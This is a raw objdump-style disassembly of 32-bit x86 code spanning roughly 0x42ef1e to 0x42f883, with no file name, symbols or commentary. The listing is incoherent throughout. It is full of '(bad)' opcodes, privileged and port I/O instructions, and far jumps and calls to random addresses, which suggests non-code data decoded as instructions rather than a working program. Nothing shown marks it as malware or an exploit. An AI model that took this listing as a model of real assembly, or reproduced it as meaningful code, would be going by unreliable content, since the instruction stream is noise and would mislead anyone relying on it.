  42ef1e:	popa   
  42ef1f:	aam    0x13
  42ef21:	jmp    0x7a14d7ea
  42ef26:	or     eax,0x717ad6e9
  42ef2b:	pop    ebx
  42ef2c:	push   es
  42ef2d:	aam    0x42
  42ef2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef30:	add    edi,eax
  42ef32:	mov    ch,0x6d
  42ef34:	into   
  42ef35:	repz mov edx,0x199be0b4
  42ef3b:	push   eax
  42ef3c:	add    esi,esp
  42ef3e:	mov    BYTE PTR [ecx],ch
  42ef40:	not    DWORD PTR ds:0xfdc62
	...
  42ef5e:	cwde   
  42ef5f:	(bad)  
  42ef60:	call   0xf81ff8d5
  42ef65:	ret    
  42ef66:	imul   ecx,DWORD PTR [edi-0x269979e7],0xffffff9c
  42ef6d:	sub    al,0xbe
  42ef6f:	or     BYTE PTR [eax+eax*8-0x2e],dh
  42ef73:	(bad)  
  42ef75:	add    eax,eax
  42ef77:	adc    DWORD PTR [edi+0x13],edi
  42ef7a:	jno    0x42ef47
  42ef7c:	hlt    
  42ef7d:	shr    DWORD PTR [eax-0x38],cl
  42ef80:	in     al,dx
  42ef81:	rcr    DWORD PTR [ebx],cl
  42ef83:	cmc    
  42ef84:	add    DWORD PTR [esp+esi*8],eax
  42ef87:	test   DWORD PTR [esp+edx*1-0xc],ecx
  42ef8b:	fcom   DWORD PTR [ebx]
  42ef8d:	xlat   BYTE PTR ds:[ebx]
  42ef8e:	push   ds
  42ef8f:	fcomi  st,st(0)
  42ef91:	outs   dx,BYTE PTR ds:[esi]
  42ef92:	jmp    0x381befcb
  42ef97:	bound  ebp,QWORD PTR [ecx-0x17]
  42ef9a:	xchg   edx,eax
  42ef9b:	(bad)  
  42ef9c:	pop    es
  42ef9d:	jb     0x42ef27
  42ef9f:	jmp    0xfde7:0xf8633a13
  42efa6:	mov    bh,0x61
  42efa8:	repnz mov cl,0xef
  42efab:	inc    esp
  42efac:	push   ebx
  42efad:	xchg   dl,ah
  42efaf:	or     DWORD PTR [eax+0x70],eax
  42efb2:	mov    edx,0x23dcfafd
  42efb7:	cmc    
  42efb8:	aas    
  42efb9:	jmp    0xaa032270
  42efbe:	aas    
  42efbf:	pop    es
  42efc0:	out    0xec,eax
	...
  42efda:	add    BYTE PTR [edx],ah
  42efdc:	fmul   DWORD PTR [edi]
  42efde:	push   esi
  42efdf:	lods   eax,DWORD PTR ds:[esi]
  42efe0:	or     eax,0x24fd4e4f
  42efe5:	adc    al,0xa9
  42efe7:	idiv   DWORD PTR [esi+0x11359c56]
  42efed:	add    BYTE PTR [esi+ecx*1-0x281b0d8f],bl
  42eff4:	ds aas 
  42eff6:	jmp    0xbcc9c1ee
  42effb:	outs   dx,DWORD PTR ds:[esi]
  42effc:	mov    bl,0x73
  42effe:	cdq    
  42efff:	iret   
  42f000:	mov    ds:0x88f7e998,eax
  42f005:	sar    BYTE PTR [ebp+0x52],0x5e
  42f009:	xor    eax,0x21c3dd
  42f00e:	imul   ah
  42f010:	fcom   QWORD PTR [eax]
  42f012:	test   eax,0x6cf089f7
  42f017:	rcr    eax,0x54
  42f01a:	and    al,BYTE PTR [edx+0x5]
  42f01d:	jne    0x42f058
  42f01f:	fwait
  42f020:	(bad)  
  42f021:	pop    ss
  42f022:	into   
  42f023:	sub    ebp,esi
  42f025:	cli    
  42f026:	add    bl,bl
  42f028:	clc    
  42f029:	div    BYTE PTR [esi+0x21]
  42f02c:	bnd je 0x42f03b
  42f02f:	inc    edx
  42f030:	cld    
  42f031:	(bad)  
  42f032:	adc    ch,cl
  42f034:	or     BYTE PTR [ebx+0x7d],bh
  42f037:	std    
  42f038:	add    al,0x74
  42f03a:	sub    eax,0x86df02a
	...
  42f057:	add    BYTE PTR [edx+0xd10cffd],al
  42f05d:	or     DWORD PTR [edx+0x0],esp
  42f060:	jb     0x42f0bc
  42f062:	add    ecx,DWORD PTR [ebx+0x530f3e75]
  42f068:	inc    edx
  42f069:	std    
  42f06a:	out    0x14,eax
  42f06c:	or     eax,0xf6d8ef09
  42f071:	enter  0xff4e,0xcb
  42f075:	pop    esp
  42f076:	cmp    ecx,DWORD PTR [ecx+0x15f7105b]
  42f07c:	jmp    0x52433074
  42f081:	ds std 
  42f083:	lds    ebx,FWORD PTR [ebx-0x6f14a7f7]
  42f089:	out    dx,eax
  42f08a:	je     0x42f09c
  42f08c:	rcr    BYTE PTR [edi+eax*1+0x53],cl
  42f090:	sar    ah,cl
  42f092:	(bad)  
  42f093:	adc    al,0x9d
  42f095:	add    al,0x56
  42f097:	pop    ebx
  42f098:	mov    al,ds:0xa8000bc6
  42f09d:	fucomi st,st(3)
  42f09f:	mov    ecx,edx
  42f0a1:	add    DWORD PTR [ecx],0x0
  42f0a4:	pop    ebp
  42f0a5:	mov    esp,ebp
  42f0a7:	loopne 0x42f102
  42f0a9:	add    al,0x0
  42f0ab:	push   ebx
  42f0ac:	imul   ecx,DWORD PTR [ebp+0x3e3974c0],0xfffffffb
  42f0b3:	dec    edi
  42f0b4:	push   edx
  42f0b5:	clc    
  42f0b6:	sbb    edx,DWORD PTR [ebx]
  42f0b8:	hlt    
  42f0b9:	sub    eax,0x3d04
	...
  42f0d2:	add    BYTE PTR [eax],al
  42f0d4:	add    dh,dh
  42f0d6:	ins    BYTE PTR es:[edi],dx
  42f0d7:	(bad)  
  42f0d8:	(bad)  
  42f0d9:	jmp    0x42f0cc
  42f0db:	je     0x42f0dd
  42f0dd:	hlt    
  42f0de:	ins    DWORD PTR es:[edi],dx
  42f0df:	jp     0x42f07c
  42f0e1:	mov    BYTE PTR [edi+edi*8-0x1],ch
  42f0e5:	outs   dx,DWORD PTR ds:[esi]
  42f0e6:	fwait
  42f0e7:	pop    esp
  42f0e8:	outs   dx,BYTE PTR ds:[esi]
  42f0e9:	xor    ah,BYTE PTR [edi+0x4ba98d6d]
  42f0ef:	push   0xa985ebfb
  42f0f4:	fucom  st(2)
  42f0f6:	mov    es,WORD PTR [ebx]
  42f0f8:	mov    ?,ebp
  42f0fa:	ins    DWORD PTR es:[edi],dx
  42f0fb:	jmp    DWORD PTR [ebp-0x18]
  42f0fe:	std    
  42f0ff:	aad    0xff
  42f101:	js     0x42f163
  42f103:	jg     0x42f184
  42f105:	lods   al,BYTE PTR ds:[esi]
  42f106:	out    dx,al
  42f107:	pop    ebx
  42f108:	jb     0x42f0f1
  42f10a:	ins    DWORD PTR es:[edi],dx
  42f10b:	inc    DWORD PTR [esp+esi*4-0x4d78f5c1]
  42f112:	popf   
  42f113:	xlat   BYTE PTR ds:[ebx]
  42f114:	jg     0x42f0d8
  42f116:	stos   BYTE PTR es:[edi],al
  42f117:	dec    DWORD PTR [ecx+esi*2-0x6c0495c3]
  42f11e:	jge    0x42f177
  42f120:	dec    eax
  42f121:	sbb    edx,DWORD PTR [edi]
  42f123:	ins    DWORD PTR es:[edi],dx
  42f124:	test   DWORD PTR [esi+edi*1+0x2d70c092],esi
  42f12b:	repz or BYTE PTR [edi],ah
  42f12e:	cs loop 0x42f0b9
  42f131:	jno    0x42f190
  42f133:	push   0xfffffffb
  42f135:	arpl   WORD PTR [ecx+ebx*2+0x1],si
	...
  42f150:	add    BYTE PTR [eax],al
  42f152:	hlt    
  42f153:	ins    DWORD PTR es:[edi],dx
  42f154:	jp     0x42f0db
  42f156:	push   ss
  42f157:	add    ebp,DWORD PTR [ebp-0x5]
  42f15a:	xor    ch,BYTE PTR [ebp-0x1]
  42f15d:	aas    
  42f15e:	lods   eax,DWORD PTR ds:[esi]
  42f15f:	fsub   DWORD PTR [ebp+0x51]
  42f162:	imul   eax,DWORD PTR [esp+ebp*2],0xda5f2f0b
  42f169:	rcl    DWORD PTR [ebx-0x32cadf6f],cl
  42f16f:	ins    BYTE PTR es:[edi],dx
  42f170:	out    0x95,eax
  42f172:	hlt    
  42f173:	add    al,0x4f
  42f175:	enter  0xb6ad,0x6b
  42f179:	(bad)  
  42f17a:	push   ebx
  42f17b:	jmp    0x1618:0xf8fed3e8
  42f182:	mov    ah,0x4
  42f184:	inc    di
  42f186:	add    BYTE PTR [esi+0x12],bl
  42f189:	add    BYTE PTR [ecx-0x78],bh
  42f18c:	icebp  
  42f18d:	ins    BYTE PTR es:[edi],dx
  42f18e:	fistp  WORD PTR [esi+0x60]
  42f191:	not    BYTE PTR [ebx-0x304bd374]
  42f197:	clc    
  42f198:	mov    eax,0x64053412
  42f19d:	(bad)  
  42f19e:	shl    DWORD PTR [ebp-0x4a6c39a5],cl
  42f1a4:	into   
  42f1a5:	add    ebx,DWORD PTR [ecx+ecx*1]
  42f1a8:	outs   dx,BYTE PTR ds:[esi]
  42f1a9:	ret    
  42f1aa:	stos   DWORD PTR es:[edi],eax
  42f1ab:	xchg   ecx,eax
  42f1ac:	ins    BYTE PTR es:[edi],dx
  42f1ad:	adc    esp,DWORD PTR [ecx-0x6c2cb5a2]
  42f1b3:	(bad)  
  42f1b4:	sub    al,0x6c
	...
  42f1ce:	add    BYTE PTR [edi-0x809d678],cl
  42f1d4:	adc    ch,BYTE PTR [ecx]
  42f1d6:	pop    eax
  42f1d7:	shr    edx,cl
  42f1d9:	fdivr  DWORD PTR [esi+0x31]
  42f1dc:	push   ebp
  42f1dd:	mov    ecx,0xcc195bd0
  42f1e2:	add    esi,esp
  42f1e4:	in     al,dx
  42f1e5:	add    BYTE PTR [eax],al
  42f1e7:	hlt    
  42f1e8:	add    al,0xa
  42f1ea:	hlt    
  42f1eb:	out    dx,eax
  42f1ec:	pop    ebp
  42f1ed:	fmul   QWORD PTR [edi]
  42f1ef:	add    eax,ebp
  42f1f1:	call   0x1c267c
  42f1f6:	fstp   DWORD PTR ds:0xc8bafa5e
  42f1fc:	idiv   DWORD PTR [edi-0x8]
  42f1ff:	aaa    
  42f200:	pop    esi
  42f201:	xchg   dl,bl
  42f203:	enter  0xc586,0xd6
  42f207:	(bad)  
  42f208:	gs (bad) 
  42f20a:	cdq    
  42f20b:	icebp  
  42f20c:	mov    edx,0xb7bbb056
  42f211:	xchg   ch,cl
  42f213:	jae    0x42f27e
  42f215:	clc    
  42f216:	push   0xffffff9c
  42f218:	and    al,0x52
  42f21a:	push   ss
  42f21b:	sbb    al,BYTE PTR ds:0xfcffcfb
  42f221:	inc    eax
  42f222:	jmp    0x9584cee
  42f227:	or     al,ch
  42f229:	dec    DWORD PTR [ebp+0x2adc2925]
  42f22f:	clc    
  42f230:	test   DWORD PTR ds:0x39,edi
	...
  42f24a:	add    BYTE PTR [eax],al
  42f24c:	loop   0x42f212
  42f24e:	push   DWORD PTR [ebp+0x27]
  42f251:	xchg   BYTE PTR ds:0xffc4e385,dh
  42f257:	push   ecx
  42f258:	mov    ch,0x88
  42f25a:	rcl    ch,0xc2
  42f25d:	xchg   BYTE PTR [ebp+ecx*1+0x8],al
  42f261:	push   ss
  42f262:	add    eax,0x1e2c09
  42f267:	mov    esp,0x57bddc4
  42f26c:	in     al,0x60
  42f26e:	jne    0x42f277
  42f270:	pop    ecx
  42f271:	sub    al,0xdc
  42f273:	stos   BYTE PTR es:[edi],al
  42f274:	mul    esi
  42f276:	add    BYTE PTR [esi],ah
  42f278:	and    DWORD PTR fs:[esp+eiz*8],ebx
  42f27c:	sti    
  42f27d:	add    eax,DWORD PTR [eax]
  42f27f:	jmp    0xab1ee7c3
  42f284:	imul   DWORD PTR [esi+esi*8+0x0]
  42f288:	push   edx
  42f289:	jmp    0x43db:0xf9588bf6
  42f290:	dec    ebp
  42f291:	fld    DWORD PTR [eax+0x14c24]
  42f297:	call   DWORD PTR [eax]
  42f299:	and    eax,0xea1d43dc
  42f29e:	into   
  42f29f:	push   0xd
  42f2a1:	aas    
  42f2a2:	sti    
  42f2a3:	imul   ebp,DWORD PTR [edx],0x152443dc
  42f2a9:	xor    esi,esi
  42f2ab:	(bad)  
  42f2ac:	sahf   
  42f2ad:	jmp    0x4368a8
	...
  42f2c6:	add    BYTE PTR [eax],al
  42f2c8:	add    BYTE PTR [esi+edx*1-0x37],dh
  42f2cc:	test   DWORD PTR [ebp+0x4a],ecx
  42f2cf:	push   es
  42f2d0:	xchg   esp,eax
  42f2d1:	popf   
  42f2d2:	dec    esi
  42f2d3:	and    ch,0x28
  42f2d6:	les    edx,FWORD PTR [ebx+ecx*4+0x79]
  42f2da:	sub    esp,0x8cd88
  42f2e0:	push   esi
  42f2e1:	repnz out dx,eax
  42f2e3:	je     0x42f2ed
  42f2e5:	inc    esi
  42f2e6:	lock out 0xf7,eax
  42f2e9:	mov    ebp,0x20f0008
  42f2ee:	enter  0x4588,0x51
  42f2f2:	add    BYTE PTR [ecx],0xf
  42f2f5:	adc    BYTE PTR [esi+0x0],al
  42f2f8:	add    BYTE PTR [ebp+0x5df844dd],cl
  42f2fe:	out    dx,eax
  42f2ff:	je     0x42f309
  42f301:	cmp    dh,ch
  42f303:	repz adc al,0x5d
  42f306:	or     BYTE PTR [ebp+0x61f441c0],al
  42f30c:	add    bl,BYTE PTR [eax]
  42f30e:	inc    edi
  42f30f:	dec    ebx
  42f310:	push   eax
  42f311:	sbb    dl,BYTE PTR [ebp-0xd]
  42f314:	lea    edx,[edx-0xb74afdc]
  42f31a:	stos   BYTE PTR es:[edi],al
  42f31b:	mov    bl,0x8c
  42f31d:	imul   esi,DWORD PTR [esi+0x66],0xbef653fb
  42f324:	cmp    BYTE PTR [ebx+0x5b],cl
  42f327:	jae    0x42f2ae
  42f329:	mov    esp,0xfb6952
	...
  42f346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f347:	add    eax,0x63324819
  42f34c:	jl     0x42f393
  42f34e:	sub    esi,DWORD PTR [edi]
  42f350:	add    dl,al
  42f352:	mov    ecx,0x99800432
  42f357:	dec    edx
  42f358:	add    al,0x87
  42f35a:	leave  
  42f35b:	pop    ebp
  42f35c:	push   cs
  42f35d:	inc    eax
  42f35e:	hlt    
  42f35f:	adc    DWORD PTR [edi+0x1499b9f1],esi
  42f365:	jne    0x42f31e
  42f367:	stos   BYTE PTR es:[edi],al
  42f368:	icebp  
  42f369:	or     esi,ebx
  42f36b:	fwait
  42f36c:	stc    
  42f36d:	mov    dl,0x37
  42f36f:	push   0xfffffff8
  42f371:	mov    dl,0x2f
  42f373:	data16 ds loopne 0x42f37b
  42f377:	or     ecx,DWORD PTR ds:[bp+di-0x30aa]
  42f37d:	or     al,BYTE PTR [ebx-0x2b3effd2]
  42f383:	cmp    eax,0xeb24c0fc
  42f388:	lock pop es
  42f38a:	mov    bl,0x38
  42f38c:	idiv   edx
  42f38e:	add    edx,ecx
  42f390:	adc    al,0x40
  42f392:	hlt    
  42f393:	call   0x484a67db
  42f398:	(bad)  
  42f39a:	or     edx,DWORD PTR [edx+0x68]
  42f39d:	adc    eax,0xffbf3ee8
  42f3a2:	js     0x42f3d1
  42f3a4:	stc    
  42f3a5:	add    DWORD PTR [ebp+ebp*2-0x1],0xffffffff
	...
  42f3c2:	add    BYTE PTR [esp+eax*1+0x71],bl
  42f3c6:	outs   dx,DWORD PTR ds:[si]
  42f3c8:	pop    ebx
  42f3c9:	gs inc esp
  42f3cb:	call   0xec0451b2
  42f3d0:	out    dx,al
  42f3d1:	clc    
  42f3d2:	aam    0xf8
  42f3d4:	lock out 0x3,eax
  42f3d7:	hlt    
  42f3d8:	mov    ah,0x10
  42f3da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f3db:	sbb    eax,DWORD PTR ds:0x8c768e9
  42f3e1:	jmp    0x2fdd:0xf0d12f51
  42f3e8:	pop    ebx
  42f3e9:	push   edx
  42f3ea:	cld    
  42f3eb:	push   ds
  42f3ec:	xchg   ebx,eax
  42f3ed:	popa   
  42f3ee:	add    dh,ah
  42f3f0:	add    al,0xca
  42f3f2:	push   cs
  42f3f3:	call   0x71471ce8
  42f3f8:	inc    esp
  42f3f9:	xor    eax,0xe66c8c2c
  42f3fe:	add    esi,esp
  42f400:	pop    ebx
  42f401:	xor    bh,al
  42f403:	out    dx,al
  42f404:	lock add al,0x15
  42f407:	xor    al,0x5
  42f409:	fs inc ebx
  42f40b:	imul   esi,esp,0x84ebc05d
  42f411:	push   ecx
  42f412:	pop    ds
  42f413:	cmc    
  42f414:	add    al,0xe9
  42f416:	add    al,BYTE PTR [ecx-0x1]
  42f419:	outs   dx,BYTE PTR ds:[esi]
  42f41a:	mov    esi,0xde116ebe
  42f41f:	mov    ebx,0xf4e73289
  42f424:	add    al,0xe9
  42f426:	push   0x0
	...
  42f43f:	add    dh,ah
  42f441:	pop    ecx
  42f442:	hlt    
  42f443:	add    DWORD PTR ds:0xb65be8c5,0x46
  42f44a:	dec    edx
  42f44b:	push   0x70f4c07b
  42f450:	xor    al,0x21
  42f452:	jmp    0x7e85a
  42f457:	mov    ebx,0x297ec9ca
  42f45c:	jae    0x42f428
  42f45e:	mov    WORD PTR [ebx+ecx*8-0x40b054c],gs
  42f465:	lock aas 
  42f467:	jmp    0xa4cff8a5
  42f46c:	mov    bl,0xb4
  42f46e:	cli    
  42f46f:	cmp    eax,DWORD PTR ds:0xefcce900
  42f476:	sub    ebx,ebp
  42f478:	aaa    
  42f479:	pop    edx
  42f47a:	imul   ebx,esi,0x2c8d0051
  42f480:	xchg   esp,eax
  42f481:	mov    ah,0xfa
  42f483:	xchg   esi,eax
  42f484:	inc    esp
  42f485:	add    eax,0xef92e900
  42f48a:	daa    
  42f48b:	cmc    
  42f48c:	aaa    
  42f48d:	pop    edx
  42f48e:	stos   DWORD PTR es:[edi],eax
  42f48f:	call   0xac0bb0c6
  42f494:	add    BYTE PTR [edx+0x54],bl
  42f497:	bound  ebx,QWORD PTR [ecx+ebx*8+0x6877b1e3]
  42f49e:	sbb    al,0x3a
  42f4a0:	mov    edx,0x72ee82
	...
  42f4bd:	mov    ds:0xf0ae52f5,al
  42f4c2:	sbb    BYTE PTR [eax],al
  42f4c4:	jmp    0xddb552c0
  42f4c9:	dec    eax
  42f4ca:	leave  
  42f4cb:	and    ebx,ecx
  42f4cd:	test   al,0x5e
  42f4cf:	adc    eax,0xffc4e77d
  42f4d4:	arpl   WORD PTR [eax],di
  42f4d6:	push   cs
  42f4d7:	test   BYTE PTR [edi+0x720004f0],al
  42f4dd:	(bad)  
  42f4de:	cmc    
  42f4df:	xchg   BYTE PTR [ecx-0x163eaa05],ah
  42f4e5:	test   DWORD PTR [eax+eax*2],0x8d044900
  42f4ec:	jle    0x42f487
  42f4ee:	mov    esi,0x86838b04
  42f4f3:	mov    edi,0xffc02a24
  42f4f8:	call   FWORD PTR [ebp-0xb]
  42f4fb:	jae    0x42f53f
  42f4fd:	out    0xb,al
  42f4ff:	sbb    al,0x14
  42f501:	lea    eax,ds:0xf51d834f
  42f507:	dec    edi
  42f508:	lea    ebx,[ecx+0x42501bf9]
  42f50e:	mov    dh,0x84
  42f510:	rcl    BYTE PTR [edx+0x74],0xc0
  42f514:	test   ch,bl
  42f516:	push   ebx
  42f517:	sub    al,0x8b
  42f519:	fcomi  st,st(4)
  42f51b:	jp     0x42f4dd
  42f51d:	sub    DWORD PTR ds:0x15f6,esi
	...
  42f537:	add    BYTE PTR [eax],al
  42f539:	add    BYTE PTR [ebp+0x9],al
  42f53c:	inc    eax
  42f53d:	add    BYTE PTR [eax-0x79ad8c3b],bl
  42f543:	xchg   edi,eax
  42f544:	xorps  xmm1,XMMWORD PTR [esi-0x6faffc3b]
  42f54b:	cdq    
  42f54c:	pop    ds
  42f54d:	sbb    al,0xd
  42f54f:	loopne 0x42f51b
  42f551:	test   DWORD PTR [ebp-0x793f6bb1],ebx
  42f557:	push   es
  42f558:	sub    al,al
  42f55a:	dec    ecx
  42f55b:	les    esi,FWORD PTR [ebx+0x36]
  42f55e:	sub    BYTE PTR [edx+0xf],0x8b
  42f562:	fcmovnu st,st(7)
  42f564:	jae    0x42f58a
  42f566:	popf   
  42f567:	fcmovnbe st,st(6)
  42f569:	call   0x39e2e5
  42f56e:	push   ss
  42f56f:	pop    edx
  42f570:	div    BYTE PTR [ecx+edi*8+0x5c]
  42f574:	mov    BYTE PTR [ecx+edi*8-0xc],al
  42f578:	add    BYTE PTR [esi-0xc],0x59
  42f57c:	jl     0x42f5c2
  42f57e:	fadd   DWORD PTR ds:0x3a881563
  42f584:	mov    edi,0xeb2e78ff
  42f589:	push   es
  42f58a:	and    al,0xe1
  42f58c:	mov    edx,0x577e0823
  42f591:	and    al,0xc1
  42f593:	push   ds
  42f594:	bound  ebx,QWORD PTR [ebx-0x3e]
  42f597:	mov    ebp,0x96f5703
  42f59c:	enter  0xbe,0x0
	...
  42f5b4:	add    BYTE PTR [eax],al
  42f5b6:	add    BYTE PTR [ecx-0x4e78ad1e],ch
  42f5bc:	push   ecx
  42f5bd:	test   ah,ch
  42f5bf:	in     al,dx
  42f5c0:	imul   edi,edi,0xffffffff
  42f5c3:	mov    ds:0xe7f17676,al
  42f5c8:	xor    cx,cx
  42f5cb:	and    ch,BYTE PTR [esi+0xf]
  42f5ce:	je     0x42f5b1
  42f5d0:	jmp    0x7eb:0x2ec42c43
  42f5d7:	and    ecx,0x3f0bfd6b
  42f5dd:	aam    0xe7
  42f5df:	outs   dx,DWORD PTR ds:[esi]
  42f5e0:	mov    bl,0x64
  42f5e2:	sti    
  42f5e3:	jno    0x42f593
  42f5e5:	lock ds jg 0x42f5f8
  42f5e9:	add    BYTE PTR [ecx],bh
  42f5eb:	push   0x5e
  42f5ed:	in     eax,dx
  42f5ee:	push   ss
  42f5ef:	outs   dx,DWORD PTR ds:[esi]
  42f5f0:	pop    ds
  42f5f1:	clc    
  42f5f2:	cli    
  42f5f3:	and    BYTE PTR [esi-0x7733728e],dh
  42f5f9:	gs sti 
  42f5fb:	fdivr  QWORD PTR ds:0xe0c3ffdd
  42f601:	inc    ebx
  42f602:	je     0x42f616
  42f604:	daa    
  42f605:	sub    DWORD PTR [edx+0x4],edi
  42f608:	pop    esp
  42f609:	pop    edx
  42f60a:	data16 fadd QWORD PTR [eax+eax*8]
  42f60e:	rcr    BYTE PTR [esi-0x249fa2ef],cl
  42f614:	add    al,0x52
  42f616:	(bad)  
  42f618:	repz test al,0x3
	...
  42f633:	add    BYTE PTR [edi+0x343de3c],al
  42f639:	cmp    eax,DWORD PTR gs:[ecx-0x3a6dfd4c]
  42f640:	cmp    al,0x42
  42f642:	loope  0x42f647
  42f644:	sbb    eax,DWORD PTR [ebp-0x57]
  42f647:	pop    eax
  42f648:	imul   edx,DWORD PTR [edi-0x6b],0xa08bec1f
  42f64f:	sti    
  42f650:	dec    esi
  42f651:	rol    ah,1
  42f653:	sti    
  42f654:	jb     0x42f65b
  42f656:	add    dl,ah
  42f658:	sti    
  42f659:	pop    es
  42f65a:	xor    eax,DWORD PTR [edi+eax*2+0x3c]
  42f65e:	into   
  42f65f:	inc    ebx
  42f660:	mov    bl,0x64
  42f662:	jmp    0x42f5e4
  42f664:	xor    al,0x2
  42f666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f667:	sti    
  42f668:	and    edx,DWORD PTR [ecx+0x25]
  42f66b:	and    al,dh
  42f66d:	add    eax,0x3f05793b
  42f672:	jecxz  0x42f677
  42f674:	(bad)  
  42f675:	(bad)  
  42f676:	call   0xd0f1ec6a
  42f67b:	mov    ebp,0x78e904cc
  42f680:	mov    dh,0xb7
  42f682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f683:	(bad)  
  42f684:	jmp    0x42f636
  42f686:	ins    DWORD PTR es:[edi],dx
  42f687:	jb     0x42f704
  42f689:	(bad)  
  42f68a:	in     al,0x3c
  42f68c:	test   BYTE PTR [eax],0x5e
  42f68f:	ret    
  42f690:	rol    DWORD PTR [ecx-0x760a1060],cl
  42f696:	call   0x42f774
	...
  42f6af:	add    BYTE PTR [eax],al
  42f6b1:	hlt    
  42f6b2:	push   ebp
  42f6b3:	fnstenv [esi+0x2e]
  42f6b6:	or     eax,0x3ff8100
  42f6bb:	add    cl,ch
  42f6bd:	sbb    ecx,eax
  42f6bf:	and    esi,ecx
  42f6c1:	test   BYTE PTR [ecx+0x2],0x1d
  42f6c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6c6:	push   ss
  42f6c7:	add    ch,bl
  42f6c9:	xchg   ecx,eax
  42f6ca:	mov    ah,0xe7
  42f6cc:	fsubp  st(6),st
  42f6ce:	add    al,0x0
  42f6d0:	jb     0x42f693
  42f6d2:	mov    edx,0x7df7e5bd
  42f6d7:	dec    esp
  42f6d8:	or     eax,0x4151c5f4
  42f6dd:	adc    al,0x54
  42f6df:	sti    
  42f6e0:	es loop 0x42f727
  42f6e3:	je     0x42f690
  42f6e5:	rcl    al,1
  42f6e7:	and    esp,ebp
  42f6e9:	scas   eax,DWORD PTR es:[edi]
  42f6ea:	stos   BYTE PTR es:[edi],al
  42f6eb:	adc    cl,ch
  42f6ed:	idiv   DWORD PTR [ebp-0x28]
  42f6f0:	ins    BYTE PTR es:[edi],dx
  42f6f1:	lods   al,BYTE PTR ds:[esi]
  42f6f2:	shr    BYTE PTR [esi],1
  42f6f4:	call   0x5637:0xdaa7efd0
  42f6fb:	xchg   BYTE PTR [esi+0x6c048807],ah
  42f701:	in     al,dx
  42f702:	add    al,0x0
  42f704:	jmp    0x394ec98d
  42f709:	mov    al,ds:0xf7e927b0
  42f70e:	add    al,0x3d
  42f711:	out    0x7d,eax
  42f713:	inc    ebx
  42f714:	fld    DWORD PTR [eax]
	...
  42f72e:	push   0xb
  42f730:	mov    ebp,edx
  42f732:	js     0x42f78d
  42f734:	inc    ebx
  42f735:	fld    DWORD PTR [edi-0x550e18fd]
  42f73b:	pop    ebp
  42f73c:	mov    eax,0x2e04f7d1
  42f741:	test   eax,0xe5bdaeb6
  42f746:	neg    DWORD PTR [edx+eiz*8-0x54346300]
  42f74d:	ret    
  42f74e:	loopne 0x42f6d5
  42f750:	in     al,dx
  42f751:	add    DWORD PTR [ecx-0x4e138548],0xffffffee
  42f758:	mov    edi,0xf1866353
  42f75d:	mov    DWORD PTR [ecx+0x1d],edx
  42f760:	adc    al,0x89
  42f762:	popa   
  42f763:	sbb    eax,0x1d518918
  42f768:	sbb    al,0x89
  42f76a:	push   ecx
  42f76b:	sbb    eax,0xfd538b28
  42f770:	dec    esi
  42f771:	mov    DWORD PTR [ecx-0x1a97ebe3],esp
  42f777:	add    eax,0x30d50000
  42f77c:	push   cs
  42f77d:	add    BYTE PTR [ebp-0x36],cl
  42f780:	inc    ebx
  42f781:	and    al,0x4d
  42f783:	sub    DWORD PTR [ebx+0x74885d40],eax
  42f789:	and    al,0x21
  42f78b:	jmp    0xe27da84d
  42f790:	cmp    BYTE PTR ds:0x0,0x0
	...
  42f7ab:	dec    ecx
  42f7ac:	dec    esi
  42f7ad:	cmp    eax,DWORD PTR [eax]
  42f7af:	(bad)  
  42f7b0:	loop   0x42f7e6
  42f7b2:	cld    
  42f7b3:	xor    DWORD PTR [esi],edi
  42f7b5:	sti    
  42f7b6:	(bad)  
  42f7b7:	bound  esi,QWORD PTR [esi-0x6]
  42f7ba:	add    BYTE PTR ds:0x963ee301,bl
  42f7c0:	xor    edi,edi
  42f7c2:	mov    cl,BYTE PTR [esp+esi*2]
  42f7c5:	push   esp
  42f7c6:	and    al,0x15
  42f7c8:	(bad)  
  42f7c9:	not    BYTE PTR [eax-0x1f]
  42f7cc:	mov    eax,es
  42f7ce:	je     0x42f7bc
  42f7d0:	out    0x73,eax
  42f7d2:	and    al,0xf9
  42f7d4:	jne    0x42f81a
  42f7d6:	and    al,0xdd
  42f7d8:	jne    0x42f826
  42f7da:	and    al,0xf4
  42f7dc:	pop    ecx
  42f7dd:	mov    WORD PTR [eax+edx*1+0x62],es
  42f7e1:	addr16 push esp
  42f7e3:	nop
  42f7e4:	mov    ebx,DWORD PTR [esi+0x68]
  42f7e7:	jl     0x42f840
  42f7e9:	(bad)  
  42f7ea:	jmp    FWORD PTR [esi+ecx*2-0xa]
  42f7ee:	jmp    FWORD PTR [ebx-0x5c50257a]
  42f7f4:	jmp    0x42f7a4
  42f7f6:	cli    
  42f7f7:	loope  0x42f7aa
  42f7f9:	bound  edi,QWORD PTR [edi]
  42f7fb:	hlt    
  42f7fc:	mov    edx,0x3ab73735
  42f801:	mov    eax,ds:0x8aa7225b
  42f806:	in     eax,0x19
  42f808:	pop    ds
  42f809:	mov    ecx,0x9236586
  42f80e:	sbb    BYTE PTR [eax],al
	...
  42f828:	jg     0x42f7c8
  42f82a:	jmp    edi
  42f82c:	add    al,0x5e
  42f82e:	(bad)  
  42f82f:	call   FWORD PTR [ebx+0x7c]
  42f832:	add    eax,ebx
  42f834:	cli    
  42f835:	adc    DWORD PTR [ebp+0x7105f440],ecx
  42f83b:	and    esi,esp
  42f83d:	pop    ebp
  42f83e:	sar    DWORD PTR [esi-0x7fac295e],0xb2
  42f845:	imul   edi,edi,0x127b0e73
  42f84b:	sti    
  42f84c:	fucomp st(3)
  42f84e:	or     esi,DWORD PTR [edx+0x5]
  42f851:	xlat   BYTE PTR ds:[ebx]
  42f852:	lds    eax,FWORD PTR [ebx]
  42f854:	adc    esi,edx
  42f856:	fwait
  42f857:	call   0x470380
  42f85c:	mov    ebx,0x8607de06
  42f861:	inc    edx
  42f862:	sar    edx,0x6a
  42f865:	bound  esp,QWORD PTR [edi-0x3f]
  42f868:	adc    ebx,DWORD PTR [esi-0x1]
  42f86b:	jle    0x42f8c7
  42f86d:	add    eax,0xeb5b03ed
  42f872:	lock add ebp,DWORD PTR [esi]
  42f875:	dec    eax
  42f876:	cmp    ecx,DWORD PTR [ebp+0x100b84c5]
  42f87c:	hlt    
  42f87d:	mov    ebx,0x117e06d
  42f882:	cmc    
  42f883:	cmc    
